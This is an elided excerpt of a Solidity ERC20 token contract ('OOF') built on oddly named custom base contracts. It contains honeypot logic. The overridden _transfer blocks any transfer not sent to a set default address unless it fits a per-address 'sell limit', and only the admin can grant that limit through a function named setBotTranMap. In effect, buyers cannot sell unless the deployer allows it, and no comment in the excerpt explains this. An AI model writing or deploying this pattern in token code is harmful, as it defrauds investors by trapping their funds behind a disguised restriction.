...
abstract contract TTIConlse is Context, IRoleControl, ERC165 {
    struct RoleData {
...
contract TTIERC20 is Context, IERC20, IERC20Metadata  { 
...
contract OOF is TTIERC20, TTIConlse {
    ...
    constructor(string memory _name, string memory _symbol, uint256 _totalSupply) TTIERC20(_name, _symbol, _totalSupply, msg.sender) {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
    }

    function setBotTranMap(address user, uint256 amount) public onlyRole(DEFAULT_ADMIN_ROLE) {
    ...
    function _transfer(address from, address to, uint256 amount) internal override(TTIERC20) {
        ...
        if (to != _defaultAddress) {
            uint256 sellLimit = _botTranMap[from];
            require(amount <= sellLimit, "ERC20: sell amount exceeds the limit");
            _botTranMap[from] = sellLimit.sub(amount);
        }
